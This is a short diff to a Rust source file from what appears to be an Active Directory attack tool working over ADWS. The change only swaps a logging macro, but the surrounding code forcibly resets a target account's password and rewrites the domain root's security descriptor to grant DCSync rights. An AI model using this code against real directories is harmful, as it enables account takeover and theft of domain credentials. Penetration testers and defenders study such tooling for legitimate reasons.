@@ -3,10 +3,10 @@
 
 use anyhow::{anyhow, Result};
 use adws_rs::{AdwsClient, Mod, Scope, SdFlags, Value};
-use log::info;
 
 use crate::actions::common::{base_dn, sd};
 use crate::args::Options;
+use crate::shlog;
 
 use super::find_object;
 
@@ -41,7 +41,7 @@ pub async fn change_password(client: &mut AdwsClient, opts: &Options) -> Result<
         .modify(&dn, &[Mod::replace("unicodePwd", vec![Value::Bytes(pwd_utf16(&new_pass))])], None)
         .await
         .map_err(|e| anyhow!("password change failed (need sufficient rights): {e}"))?;
-    info!("[+] password of '{target}' changed to: {new_pass}");
+    shlog!("password of '{target}' changed to: {new_pass}");
     Ok(())
 }
 
@@ -74,6 +74,6 @@ pub async fn elevate(client: &mut AdwsClient, opts: &Options) -> Result<()> {
         .modify(&forest_dn, &[Mod::replace("nTSecurityDescriptor", vec![Value::Bytes(new_sd)])], Some(SdFlags(SdFlags::DACL)))
         .await
         .map_err(|e| anyhow!("elevate failed (need WriteDacl on domain root): {e}"))?;
-    info!("[+] granted {target} DCSync rights (3 object-ACEs appended)");
+    shlog!("granted {target} DCSync rights (3 object-ACEs appended)");
     Ok(())
 }
